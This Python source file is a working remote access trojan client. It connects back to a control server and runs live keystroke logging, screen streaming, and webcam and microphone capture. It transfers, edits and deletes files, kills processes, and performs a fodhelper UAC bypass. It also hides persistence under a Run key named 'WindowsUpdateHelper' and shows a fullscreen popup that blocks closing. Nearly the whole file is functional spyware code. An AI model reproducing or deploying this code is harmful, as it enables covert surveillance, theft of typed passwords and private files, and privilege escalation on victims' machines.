import socket
import subprocess
import time
import os
import json
import base64
import platform
import sys
import threading
import tkinter as tk
from tkinter import messagebox

# Auto-install required libraries
def install_package(package, import_name=None):
    import_name = import_name or package
    try:
        __import__(import_name)
    except ImportError:
        print(f"📦 Installing {package}...")
        # Check if Kali/Debian with restricted environment
        if platform.system() == "Linux" and os.path.exists("/usr/bin/apt"):
            try:
                # Try with --break-system-packages for Kali/Debian
                subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package, "--break-system-packages"])
            except:
                print(f"⚠️ Try manually: sudo apt install python3-{package.lower()}")
        else:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package])
        print(f"✅ {package} installed")

install_package("Pillow", "PIL")
install_package("mss")
install_package("sounddevice")
install_package("numpy")
install_package("pynput")
install_package("psutil")

SERVER_IP = "127.0.0.1"
PORT = 5000

current_dir = os.getcwd()
os_name = platform.system()

client_lock = threading.Lock()

# OS-specific command mappings
COMMANDS = {
    "Windows": {
        "list_files": "dir",
        "list_processes": "tasklist",
        "network_info": "ipconfig",
        "system_info": "systeminfo",
        "find_process": "tasklist | findstr",
        "kill_process": "taskkill /F /IM",
        "restart": "shutdown /r /t 0",
        "shutdown": "shutdown /s /t 0",
        "lock": "rundll32.exe user32.dll,LockWorkStation",
        "clear": "cls"
    },
    "Linux": {
        "list_files": "ls -la",
        "list_processes": "ps aux",
        "network_info": "ip addr",
        "system_info": "uname -a && lsb_release -a 2>/dev/null || cat /etc/os-release",
        "find_process": "ps aux | grep",
        "kill_process": "killall",
        "restart": "reboot",
        "shutdown": "shutdown -h now",
        "lock": "gnome-screensaver-command -l 2>/dev/null || loginctl lock-session 2>/dev/null || echo 'Lock not supported'",
        "clear": "clear"
    }
}

def get_command(cmd_type):
    """Get OS-specific command"""
    return COMMANDS.get(os_name, COMMANDS["Linux"]).get(cmd_type, cmd_type)

def connect_server():
    """Connect to server with retry"""
    while True:
        try:
            client = socket.socket()
            client.connect((SERVER_IP, PORT))
            print("✓ Connected to server")
            
            # Send client info on connect
            info = {
                "type": "CLIENT_INFO",
                "hostname": platform.node(),
                "os": platform.system(),
                "os_version": platform.version(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "user": os.getlogin()
            }
            with client_lock:
                client.send(json.dumps(info).encode())
            
            return client
        except:
            print("Connection failed. Retrying in 5 seconds...")
            time.sleep(5)

def take_screenshot():
    """Capture screenshot - high quality with memory management"""
    try:
        from PIL import Image, ImageGrab
        import io
        
        if os_name == "Windows":
            screenshot = ImageGrab.grab()
        else:
            # Linux/Mac using mss or PIL
            try:
                screenshot = ImageGrab.grab()
            except:
                import mss
                import mss.tools
                with mss.mss() as sct:
                    screenshot = sct.grab(sct.monitors[1])
                    screenshot = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
        
        # Get original resolution
        orig_width, orig_height = screenshot.size
        total_pixels = orig_width * orig_height
        
        # Adaptive quality and size based on resolution to prevent crash
        if total_pixels > 8294400:  # > 4K (3840x2160)
            # Very large - resize to 4K max
            max_size = (3840, 2160)
            screenshot.thumbnail(max_size, Image.Resampling.LANCZOS)
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=90, optimize=True, subsampling=0)
            img_data = base64.b64encode(buffer.getvalue()).decode()
            img_format = "JPEG"
            
        elif total_pixels > 3686400:  # > 2K (2560x1440)
            # 4K - high quality JPEG
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=92, optimize=True, subsampling=0)
            img_data = base64.b64encode(buffer.getvalue()).decode()
            img_format = "JPEG"
            
        elif total_pixels > 2073600:  # > Full HD (1920x1080)
            # 2K - very high quality
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=93, optimize=True, subsampling=0)
            img_data = base64.b64encode(buffer.getvalue()).decode()
            img_format = "JPEG"
            
        else:
            # Full HD or lower - maximum quality
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=95, optimize=True, subsampling=0)
            img_data = base64.b64encode(buffer.getvalue()).decode()
            img_format = "JPEG"
        
        # Safety check - if still too large (>15MB), compress more
        max_size_bytes = 15 * 1024 * 1024  # 15MB limit
        if len(img_data) > max_size_bytes:
            # Progressively reduce quality until size is acceptable
            for quality in [85, 80, 75, 70]:
                buffer = io.BytesIO()
                screenshot.save(buffer, format='JPEG', quality=quality, optimize=True)
                img_data = base64.b64encode(buffer.getvalue()).decode()
                if len(img_data) <= max_size_bytes:
                    break
            img_format = "JPEG"
        
        # Clear memory
        del screenshot
        del buffer
        
        return json.dumps({
            "type": "SCREENSHOT",
            "status": "success",
            "data": img_data,
            "size": len(img_data),
            "format": img_format,
            "resolution": f"{orig_width}x{orig_height}"
        })
        
    except MemoryError:
        return json.dumps({
            "type": "SCREENSHOT",
            "status": "error",
            "message": "Screenshot too large - insufficient memory"
        })
    except ImportError as e:
        return json.dumps({
            "type": "SCREENSHOT",
            "status": "error",
            "message": f"Screenshot library not installed: {str(e)}. Run: pip install pillow mss"
        })
    except Exception as e:
        return json.dumps({
            "type": "SCREENSHOT",
            "status": "error",
            "message": f"Screenshot failed: {str(e)}"
        })

def capture_webcam():
    """Capture webcam photo — tries OpenCV first, then fallback."""
    try:
        import io
        frame_captured = False
        img_data = None

        # ── Method 1: OpenCV (best quality) ───────────────────────────────────
        try:
            import cv2
            cap = cv2.VideoCapture(0)   # 0 = default camera
            if not cap.isOpened():
                # Try camera index 1 (external webcam)
                cap = cv2.VideoCapture(1)
            if cap.isOpened():
                cap.set(cv2.CAP_PROP_FRAME_WIDTH,  1280)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
                cap.set(cv2.CAP_PROP_AUTOFOCUS, 1)
                # Warm-up frames (camera needs a moment to adjust exposure)
                for _ in range(5):
                    cap.read()
                ret, frame = cap.read()
                cap.release()
                if ret and frame is not None:
                    from PIL import Image
                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    pil_img   = Image.fromarray(frame_rgb)
                    buf = io.BytesIO()
                    pil_img.save(buf, format='JPEG', quality=90, optimize=True)
                    img_data = base64.b64encode(buf.getvalue()).decode()
                    w, h = pil_img.size
                    frame_captured = True
        except ImportError:
            pass  # cv2 not installed, try fallback

        # ── Method 2: Windows DirectShow via PIL (fallback) ───────────────────
        if not frame_captured and os_name == "Windows":
            try:
                import subprocess, tempfile, os as _os
                tmp = tempfile.mktemp(suffix=".jpg")
                # Use PowerShell + Windows Camera API
                ps_cmd = (
                    f"Add-Type -AssemblyName System.Windows.Forms; "
                    f"$cam = [Windows.Media.Capture.MediaCapture]::new(); "
                    f"Start-Sleep -m 500"
                )
                # Simpler: use ffmpeg if available
                result = subprocess.run(
                    ["ffmpeg", "-y", "-f", "dshow", "-i", "video=0",
                     "-frames:v", "1", "-q:v", "2", tmp],
                    capture_output=True, timeout=10
                )
                if result.returncode == 0 and _os.path.exists(tmp):
                    with open(tmp, "rb") as f:
                        img_data = base64.b64encode(f.read()).decode()
                    _os.remove(tmp)
                    w, h = 1280, 720
                    frame_captured = True
            except Exception:
                pass

        if not frame_captured or not img_data:
            return json.dumps({
                "type": "WEBCAM",
                "status": "error",
                "message": "No camera found or camera access denied. Install opencv-python: pip install opencv-python"
            })

        return json.dumps({
            "type": "WEBCAM",
            "status": "success",
            "data": img_data,
            "resolution": f"{w}x{h}"
        })

    except Exception as e:
        return json.dumps({"type": "WEBCAM", "status": "error", "message": str(e)})

def capture_audio(duration=10):
    """Capture microphone audio and return as base64 WAV"""
    try:
        import sounddevice as sd
        import numpy as np
        import wave
        import io

        sample_rate = 44100
        channels = 2

        import threading as _t
        import time as _time

        print(f"🎤 Recording audio for {duration} seconds...")

        result = [None]
        rec_err = [None]

        def _record():
            try:
                result[0] = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=channels, dtype='int16')
                sd.wait()
            except Exception as e:
                rec_err[0] = e

        rec_thread = _t.Thread(target=_record, daemon=True)
        rec_thread.start()
        rec_thread.join(timeout=duration + 20)

        if rec_thread.is_alive():
            sd.stop()
            raise Exception("Recording timed out - no microphone response")
        if rec_err[0]:
            raise rec_err[0]
        if result[0] is None:
            raise Exception("No audio data received from microphone")

        recording = result[0]
        print("✓ Recording complete")

        buffer = io.BytesIO()
        with wave.open(buffer, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)
            wf.setframerate(sample_rate)
            wf.writeframes(recording.tobytes())

        audio_data = base64.b64encode(buffer.getvalue()).decode()

        del recording
        del buffer

        return json.dumps({
            "type": "MICROPHONE",
            "status": "success",
            "data": audio_data,
            "size": len(audio_data),
            "duration": duration,
            "sample_rate": sample_rate,
            "channels": channels,
            "format": "WAV"
        })

    except ImportError as e:
        return json.dumps({
            "type": "MICROPHONE",
            "status": "error",
            "message": f"Audio library not installed: {str(e)}. Run: pip install sounddevice numpy"
        })
    except Exception as e:
        return json.dumps({
            "type": "MICROPHONE",
            "status": "error",
            "message": f"Audio capture failed: {str(e)}"
        })

# ── Live Screen Stream ─────────────────────────────────────────────────────────
_screen_stream_active = False
_screen_stream_thread = None

def capture_live_frame():
    try:
        from PIL import Image
        import io
        import mss
        
        # Try mss first as it is extremely fast (uses direct OS APIs)
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            pil_img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            
        orig_w, orig_h = pil_img.size
        max_w = 1024
        if orig_w > max_w:
            ratio = max_w / orig_w
            new_size = (max_w, int(orig_h * ratio))
            pil_img = pil_img.resize(new_size, Image.Resampling.BILINEAR)
        
        buffer = io.BytesIO()
        # Quality 50 is the sweet spot: small size (~25-35KB), fast compression, good legibility
        pil_img.save(buffer, format='JPEG', quality=50, optimize=True)
        img_data = base64.b64encode(buffer.getvalue()).decode()
        
        return json.dumps({
            "type": "LIVE_SCREEN",
            "status": "success",
            "data": img_data,
            "resolution": f"{orig_w}x{orig_h}"
        })
    except Exception as e:
        # Fallback to ImageGrab if mss fails
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            orig_w, orig_h = screenshot.size
            max_w = 1024
            if orig_w > max_w:
                ratio = max_w / orig_w
                new_size = (max_w, int(orig_h * ratio))
                screenshot = screenshot.resize(new_size, Image.Resampling.BILINEAR)
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=50, optimize=True)
            img_data = base64.b64encode(buffer.getvalue()).decode()
            return json.dumps({
                "type": "LIVE_SCREEN",
                "status": "success",
                "data": img_data,
                "resolution": f"{orig_w}x{orig_h}"
            })
        except Exception as ex:
            return json.dumps({
                "type": "LIVE_SCREEN",
                "status": "error",
                "message": f"Capture error: {ex}"
            })

def start_screen_stream():
    global _screen_stream_active, _screen_stream_thread
    if _screen_stream_active:
        return
    _screen_stream_active = True
    def stream():
        global client, _screen_stream_active
        while _screen_stream_active:
            try:
                frame_data = capture_live_frame()
                if frame_data:
                    payload = frame_data.encode()
                    with client_lock:
                        client.send(payload)
                        client.send(b"\n[FRAME_END]\n")
                # Wait 40ms (corresponds to ~25 FPS max)
                time.sleep(0.04)
            except Exception:
                break
        _screen_stream_active = False

    _screen_stream_thread = threading.Thread(target=stream, daemon=True)
    _screen_stream_thread.start()

def stop_screen_stream():
    global _screen_stream_active
    _screen_stream_active = False


# ── Keylog Live-Stream State ────────────────────────────────────────────────────
_keylog_listener = None
_keylog_active = False


def start_keylog_stream():
    """Start background listener that streams [KEYSTROKE] lines live to server."""
    global _keylog_listener, _keylog_active
    _keylog_active = True
    from pynput import keyboard
    from datetime import datetime

    def on_press(key):
        if not _keylog_active:
            return False
        try:
            ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            try:
                k = key.char
            except AttributeError:
                k = None
            if k is not None:
                line = f"[KEYSTROKE] {ts} {k}"
            else:
                s = str(key)
                if s.startswith("Key."):
                    line = f"[KEYSTROKE] {ts} <{s.replace('Key.', '').upper()}>"
                elif s.startswith("<") and s.endswith(">"):
                    line = f"[KEYSTROKE] {ts} {s}"
                else:
                    line = f"[KEYSTROKE] {ts} <{s.upper()}>"
            global client
            with client_lock:
                client.send(line.encode())
                client.send(b"\n")
        except Exception:
            pass

    _keylog_listener = keyboard.Listener(on_press=on_press)
    _keylog_listener.start()


def stop_keylog_stream():
    """Stop the keylog listener and signal end-of-stream."""
    global _keylog_listener, _keylog_active
    _keylog_active = False
    if _keylog_listener is not None:
        try:
            _keylog_listener.stop()
        except Exception:
            pass
        _keylog_listener = None
    global client
    try:
        with client_lock:
            client.send(b"[KEYLOG_END]\n")
    except Exception:
        pass

# ── Microphone Live-Stream State ─────────────────────────────────────────────────
_mic_active = False
_mic_frames = []
_mic_stream = None


def start_mic_stream():
    """Start InputStream that accumulates audio chunks in memory."""
    global _mic_active, _mic_frames, _mic_stream
    _mic_active = True
    _mic_frames = []
    import sounddevice as sd
    import numpy as np

    def callback(indata, frames, time_info, status):
        if _mic_active:
            _mic_frames.append(indata.copy())

    _mic_stream = sd.InputStream(samplerate=44100, channels=2, dtype='int16', callback=callback)
    _mic_stream.start()
    print("🎤 Mic stream started")


def stop_mic_stream():
    """Stop stream, encode WAV as base64 JSON, return response string."""
    global _mic_active, _mic_frames, _mic_stream
    _mic_active = False
    time.sleep(0.3)

    if _mic_stream is not None:
        try:
            _mic_stream.stop()
        except Exception:
            pass
        try:
            _mic_stream.close()
        except Exception:
            pass
        _mic_stream = None

    if not _mic_frames:
        _mic_frames = []
        return json.dumps({"type": "MICROPHONE", "status": "error", "message": "No audio captured"})

    import numpy as np
    import wave
    import io

    try:
        recording = np.concatenate(_mic_frames, axis=0)
    except Exception:
        _mic_frames = []
        return json.dumps({"type": "MICROPHONE", "status": "error", "message": "Failed to concatenate audio frames"})

    sample_rate = 44100
    channels = 2
    duration = round(len(recording) / sample_rate, 1)

    buffer = io.BytesIO()
    with wave.open(buffer, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(2)
        wf.setframerate(sample_rate)
        wf.writeframes(recording.tobytes())

    audio_data = base64.b64encode(buffer.getvalue()).decode()
    _mic_frames = []

    return json.dumps({
        "type": "MICROPHONE",
        "status": "success",
        "data": audio_data,
        "size": len(audio_data),
        "duration": duration,
        "sample_rate": sample_rate,
        "channels": channels,
        "format": "WAV"
    })


def download_file(filepath):
    """Send file to server"""
    try:
        if not os.path.exists(filepath):
            return json.dumps({"type": "DOWNLOAD", "status": "error", "message": "File not found"})
        
        # Check file size limit
        file_size = os.path.getsize(filepath)
        if file_size > 50 * 1024 * 1024:  # 50MB limit
            return json.dumps({
                "type": "DOWNLOAD",
                "status": "error",
                "message": f"File too large: {file_size / (1024*1024):.2f}MB (max 50MB)"
            })
        
        with open(filepath, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode()
        
        return json.dumps({
            "type": "DOWNLOAD",
            "status": "success",
            "filename": os.path.basename(filepath),
            "data": file_data,
            "size": file_size
        })
    except Exception as e:
        return json.dumps({"type": "DOWNLOAD", "status": "error", "message": str(e)})

def upload_file(filename, data_b64):
    """Receive file from server"""
    try:
        # Limit file size to prevent memory issues
        if len(data_b64) > 70000000:  # ~50MB after base64 encoding
            return json.dumps({
                "type": "UPLOAD",
                "status": "error",
                "message": "File too large (max 50MB)"
            })
        
        file_data = base64.b64decode(data_b64)
        
        if os.path.isabs(filename):
            filepath = filename
        else:
            filepath = os.path.join(current_dir, filename)
            
        parent_dir = os.path.dirname(filepath)
        if parent_dir and not os.path.exists(parent_dir):
            os.makedirs(parent_dir, exist_ok=True)
            
        with open(filepath, 'wb') as f:
            f.write(file_data)
        
        return json.dumps({
            "type": "UPLOAD",
            "status": "success",
            "message": f"File saved: {filepath}",
            "size": len(file_data)
        })
    except Exception as e:
        return json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)})

def get_process_list():
    """Get clean list of running processes using psutil"""
    try:
        import psutil
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'status', 'memory_info']):
            try:
                info = proc.info
                mem_bytes = info['memory_info'].rss if info['memory_info'] else 0
                mem_mb = round(mem_bytes / (1024 * 1024), 1)
                processes.append({
                    "pid": info['pid'],
                    "name": info['name'] or "Unknown",
                    "status": info['status'] or "unknown",
                    "memory": mem_mb
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        return json.dumps({
            "type": "PROCESS_LIST",
            "status": "success",
            "data": processes
        })
    except Exception as e:
        return json.dumps({
            "type": "PROCESS_LIST",
            "status": "error",
            "message": str(e)
        })

def kill_process_by_pid(pid_str):
    """Kill process by PID and handle errors"""
    try:
        import psutil
        pid = int(pid_str)
        proc = psutil.Process(pid)
        proc.kill()
        return json.dumps({
            "type": "KILL_PROCESS",
            "status": "success",
            "pid": pid
        })
    except Exception as e:
        return json.dumps({
            "type": "KILL_PROCESS",
            "status": "error",
            "message": str(e),
            "pid": pid_str
        })

def get_system_metrics():
    """Get CPU, RAM, and Disk metrics"""
    try:
        import psutil
        cpu = psutil.cpu_percent(interval=None)
        ram = psutil.virtual_memory().percent
        try:
            disk = psutil.disk_usage('/').percent
        except Exception:
            try:
                disk = psutil.disk_usage('C:\\').percent
            except Exception:
                disk = 0.0
        return json.dumps({
            "type": "SYSTEM_METRICS",
            "status": "success",
            "data": {
                "cpu": cpu,
                "ram": ram,
                "disk": disk
            }
        })
    except Exception as e:
        return json.dumps({
            "type": "SYSTEM_METRICS",
            "status": "error",
            "message": str(e)
        })

def list_directory_contents(path):
    """List contents of specified path for the visual file manager"""
    try:
        if not path or path == "":
            path = os.getcwd()
        elif path.upper() == "DRIVES":
            import psutil
            items = []
            for part in psutil.disk_partitions(all=True):
                if part.mountpoint:
                    items.append({
                        "name": part.mountpoint,
                        "is_dir": True,
                        "size": 0.0
                    })
            seen = set()
            unique_items = []
            for item in items:
                if item["name"] not in seen:
                    seen.add(item["name"])
                    unique_items.append(item)
            return json.dumps({
                "type": "FILE_BROWSER",
                "status": "success",
                "path": "System Drives",
                "data": unique_items
            })
        else:
            path = os.path.abspath(path)

        items = []
        for entry in os.scandir(path):
            try:
                is_dir = entry.is_dir()
                size = entry.stat().st_size if not is_dir else 0
                items.append({
                    "name": entry.name,
                    "is_dir": is_dir,
                    "size": round(size / 1024, 1)
                })
            except Exception:
                continue

        items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))

        return json.dumps({
            "type": "FILE_BROWSER",
            "status": "success",
            "path": path,
            "data": items
        })
    except Exception as e:
        return json.dumps({
            "type": "FILE_BROWSER",
            "status": "error",
            "message": str(e),
            "path": path
        })

def delete_remote_file(path):
    """Delete remote file or folder recursively"""
    try:
        path = os.path.abspath(path)
        if not os.path.exists(path):
            raise FileNotFoundError(f"Path not found: {path}")

        if os.path.isdir(path):
            import shutil
            shutil.rmtree(path)
        else:
            os.remove(path)

        return json.dumps({
            "type": "DELETE_FILE",
            "status": "success",
            "path": path
        })
    except Exception as e:
        return json.dumps({
            "type": "DELETE_FILE",
            "status": "error",
            "message": str(e),
            "path": path
        })

def read_text_file(path):
    """Read remote text file safely with size checks, binary detection, and encoding preservation"""
    try:
        path = os.path.abspath(path)
        if not os.path.exists(path):
            raise FileNotFoundError(f"File not found: {path}")
            
        # 1. Size Check (Cap at 2 MB)
        size = os.path.getsize(path)
        if size > 2 * 1024 * 1024:
            return json.dumps({
                "type": "READ_TEXT_FILE",
                "status": "error",
                "message": "File is too large (limit is 2 MB).",
                "path": path
            })
            
        # 2. Binary File Detection
        with open(path, "rb") as f:
            chunk = f.read(1024)
            if b"\x00" in chunk:
                return json.dumps({
                    "type": "READ_TEXT_FILE",
                    "status": "error",
                    "message": "Cannot open binary files in the text editor.",
                    "path": path
                })

        # 3. Read & Detect Encoding
        encodings = ["utf-8", "cp1252"]
        raw_data = None
        detected_encoding = None
        
        with open(path, "rb") as f:
            raw_data = f.read()

        for enc in encodings:
            try:
                decoded = raw_data.decode(enc)
                detected_encoding = enc
                break
            except UnicodeDecodeError:
                continue
                
        if detected_encoding is None:
            # Fallback
            decoded = raw_data.decode("utf-8", errors="replace")
            detected_encoding = "utf-8"

        # Base64 encode the decoded string safely to prevent carriage return/newline breakage in sockets
        b64_content = base64.b64encode(decoded.encode("utf-8")).decode("utf-8")

        return json.dumps({
            "type": "READ_TEXT_FILE",
            "status": "success",
            "path": path,
            "encoding": detected_encoding,
            "content": b64_content
        })
    except Exception as e:
        return json.dumps({
            "type": "READ_TEXT_FILE",
            "status": "error",
            "message": str(e),
            "path": path
        })

def write_text_file(path, encoding, content_b64):
    """Write content back to file using original encoding"""
    try:
        path = os.path.abspath(path)
        # Decode base64 bytes to raw bytes, then decode as utf-8 (which is how we encoded the string on read)
        text_data = base64.b64decode(content_b64).decode("utf-8")
        
        # Write back using detected encoding
        with open(path, "w", encoding=encoding, errors="replace") as f:
            f.write(text_data)
            
        return json.dumps({
            "type": "WRITE_TEXT_FILE",
            "status": "success",
            "path": path
        })
    except Exception as e:
        return json.dumps({
            "type": "WRITE_TEXT_FILE",
            "status": "error",
            "message": str(e),
            "path": path
        })


# ── Privilege Info & UAC Bypass ───────────────────────────────────────────────

def get_privilege_info():
    """Return current user privilege level, integrity, and UAC status."""
    info = {
        "type": "PRIV_INFO",
        "user": "",
        "is_admin": False,
        "integrity": "Unknown",
        "uac_enabled": False,
        "os": platform.system(),
        "elevated": False,
    }
    try:
        info["user"] = os.getlogin()
    except Exception:
        import getpass
        info["user"] = getpass.getuser()

    if platform.system() != "Windows":
        import pwd
        info["is_admin"] = (os.geteuid() == 0)
        info["integrity"] = "Root" if info["is_admin"] else "User"
        info["elevated"] = info["is_admin"]
        return json.dumps(info)

    try:
        import ctypes
        info["is_admin"] = bool(ctypes.windll.shell32.IsUserAnAdmin())

        # Get integrity level via whoami /groups — reliable across all Windows versions
        # Integrity SIDs: Low=S-1-16-4096, Medium=S-1-16-8192, High=S-1-16-12288, System=S-1-16-16384
        result = subprocess.run(
            ["whoami", "/groups"],
            capture_output=True, text=True, timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        groups_out = result.stdout.lower()
        if "s-1-16-16384" in groups_out:
            info["integrity"] = "System"
            info["elevated"]  = True
        elif "s-1-16-12288" in groups_out:
            info["integrity"] = "High"
            info["elevated"]  = True
        elif "s-1-16-4096" in groups_out:
            info["integrity"] = "Low"
            info["elevated"]  = False
        else:
            # Default = Medium (S-1-16-8192)
            info["integrity"] = "Medium"
            info["elevated"]  = False

        import winreg
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
            val, _ = winreg.QueryValueEx(k, "EnableLUA")
            info["uac_enabled"] = bool(val)
            winreg.CloseKey(k)
        except Exception:
            info["uac_enabled"] = True

    except Exception as ex:
        info["error"] = str(ex)


    return json.dumps(info)


def uac_bypass_fodhelper():
    """Attempt UAC bypass using fodhelper.exe auto-elevation (Windows only)."""
    if platform.system() != "Windows":
        return json.dumps({"type": "UAC_BYPASS", "status": "error",
                           "message": "UAC bypass only works on Windows."})
    try:
        import ctypes, winreg

        if ctypes.windll.shell32.IsUserAnAdmin():
            return json.dumps({"type": "UAC_BYPASS", "status": "already_elevated",
                               "message": "Already HIGH integrity — no bypass needed."})

        cmd = (f'"{sys.executable}"' if getattr(sys, 'frozen', False)
               else f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"')

        key_path = r'Software\Classes\ms-settings\shell\open\command'
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, '',                0, winreg.REG_SZ, cmd)
        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
        winreg.CloseKey(key)

        subprocess.Popen(['fodhelper.exe'],
                         creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
        time.sleep(2)

        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except Exception:
            pass

        return json.dumps({
            "type": "UAC_BYPASS",
            "status": "success",
            "message": "✅ fodhelper bypass triggered! Elevated client relaunching — watch for new HIGH connection."
        })
    except Exception as e:
        return json.dumps({"type": "UAC_BYPASS", "status": "error", "message": str(e)})


def _add_persistence():
    """Add to Windows startup registry (HKCU Run) for persistence."""
    if platform.system() == "Windows":
        try:
            import winreg as _wr
            if getattr(sys, 'frozen', False):
                cmd_line = f'"{sys.executable}"'
            else:
                cmd_line = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'
            key = _wr.OpenKey(_wr.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Run",
                              0, _wr.KEY_SET_VALUE)
            _wr.SetValueEx(key, "WindowsUpdateHelper", 0, _wr.REG_SZ, cmd_line)
            _wr.CloseKey(key)
        except Exception:
            pass


def show_cyber_popup(title, message):
    """Show a premium floating borderless cyberpunk style popup with cycling neon borders."""
    import tkinter as tk
    import threading
    import platform
    import time

    root = tk.Tk()
    root.title(title)
    root.configure(bg="#0B0B0F")
    root.attributes('-topmost', True)
    root.overrideredirect(True)  # Borderless for premium custom HUD style

    w, h = 500, 300
    sw = root.winfo_screenwidth()
    sh = root.winfo_screenheight()
    x = (sw - w) // 2
    y = (sh - h) // 2
    root.geometry(f"{w}x{h}+{x}+{y}")

    # Neon Color Cycling Border
    border_frame = tk.Frame(root, bg="#00E5FF")
    border_frame.pack(fill="both", expand=True, padx=3, pady=3)
    
    inner_frame = tk.Frame(border_frame, bg="#09090D")
    inner_frame.pack(fill="both", expand=True, padx=2, pady=2)

    # Accent bar
    accent_bar = tk.Frame(inner_frame, bg="#00E5FF", height=5)
    accent_bar.pack(fill="x")

    # Blinking status dot
    dot_frame = tk.Frame(inner_frame, bg="#09090D")
    dot_frame.pack(anchor="ne", padx=15, pady=(10, 0))
    status_dot = tk.Label(dot_frame, text="● SYSTEM LINK ACTIVE", font=("Consolas", 8, "bold"), bg="#09090D", fg="#FF0055")
    status_dot.pack()

    def blink_dot():
        try:
            current_fg = status_dot.cget("fg")
            next_fg = "#09090D" if current_fg == "#FF0055" else "#FF0055"
            status_dot.config(fg=next_fg)
            root.after(400, blink_dot)
        except:
            pass
    blink_dot()

    # Header title
    header = tk.Label(inner_frame, text="", font=("Consolas", 13, "bold"), bg="#09090D", fg="#00E5FF")
    header.pack(pady=(5, 5))

    # Decorative line
    dec_line = tk.Label(inner_frame, text="[ ======================================= ]", font=("Consolas", 9), bg="#09090D", fg="#454555")
    dec_line.pack()

    # Message text (will be typed out)
    msg_label = tk.Label(
        inner_frame, text="", font=("Segoe UI", 11, "bold"), bg="#09090D", fg="#ECEFF1",
        wraplength=440, justify="center"
    )
    msg_label.pack(pady=15, expand=True)

    # Window Shake Animation
    def shake_window(step=0):
        try:
            if step < 12:
                dx = 15 if step % 2 == 0 else -15
                root.geometry(f"{w}x{h}+{x + dx}+{y}")
                root.after(40, shake_window, step + 1)
            else:
                root.geometry(f"{w}x{h}+{x}+{y}")
        except:
            pass

    # Typing text effect
    def type_text(widget, full_text, current_text="", char_idx=0):
        try:
            if char_idx < len(full_text):
                current_text += full_text[char_idx]
                widget.config(text=current_text)
                root.after(20, type_text, widget, full_text, current_text, char_idx + 1)
        except:
            pass

    # Color cycling pulse animation
    def pulse_border(color_idx=0):
        try:
            colors = ["#FF0055", "#00E5FF", "#00FF66", "#FFFF00"]
            border_frame.config(bg=colors[color_idx])
            header.config(fg=colors[color_idx])
            accent_bar.config(bg=colors[color_idx])
            root.after(800, pulse_border, (color_idx + 1) % len(colors))
        except:
            pass

    # Acknowledge Button
    btn = tk.Button(
        inner_frame, text="[ ACKNOWLEDGE RECEIPT ]", command=root.destroy,
        font=("Consolas", 11, "bold"), bg="#1A1A22", fg="#00E5FF",
        relief="flat", activebackground="#00E5FF", activeforeground="#121214",
        padx=30, pady=8, cursor="hand2"
    )
    btn.pack(pady=(5, 20))

    def on_enter(e): btn.config(bg="#00E5FF", fg="#121214")
    def on_leave(e): btn.config(bg="#1A1A22", fg="#00E5FF")
    btn.bind("<Enter>", on_enter)
    btn.bind("<Leave>", on_leave)

    # Sound play thread
    def play_warning_sound():
        if platform.system() == "Windows":
            try:
                import winsound
                # Sequence of high-tech alert chirps
                for _ in range(2):
                    winsound.Beep(1800, 100)
                    winsound.Beep(1200, 100)
            except:
                pass

    # Speech synthesis thread
    def speak_message():
        if platform.system() == "Windows":
            try:
                import subprocess
                clean_msg = message.replace("'", "").replace('"', "")
                ps_cmd = (
                    'powershell -Command "Add-Type -AssemblyName System.Speech; '
                    '$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
                    '$synth.Rate = -1; '
                    f'$synth.Speak(\'Incoming message. {clean_msg}\')"'
                )
                subprocess.run(ps_cmd, shell=True, creationflags=0x08000000)
            except:
                pass

    # Run animations and effects
    shake_window()
    pulse_border()
    
    # Start typing effects after window finishes shaking
    root.after(500, lambda: type_text(header, f"✉  {title.upper()}"))
    root.after(800, lambda: type_text(msg_label, message))

    # Play warning sounds and voice in background
    threading.Thread(target=play_warning_sound, daemon=True).start()
    root.after(1000, lambda: threading.Thread(target=speak_message, daemon=True).start())

    root.mainloop()


def show_override_popup(title, message):
    """Show fullscreen blinking system override screen with sirens and voice synthesizer."""
    import tkinter as tk
    root = tk.Tk()
    root.title(title)

    # Borderless + topmost + start invisible (fade-in)
    root.overrideredirect(True)
    root.attributes('-topmost', True)
    root.attributes('-alpha', 0.0)

    sw = root.winfo_screenwidth()
    sh = root.winfo_screenheight()
    root.geometry(f"{sw}x{sh}+0+0")
    root.configure(bg="#FF003C")

    # Block close attempts
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.bind("<Alt-F4>", lambda e: "break")
    root.bind("<Escape>", lambda e: "break")

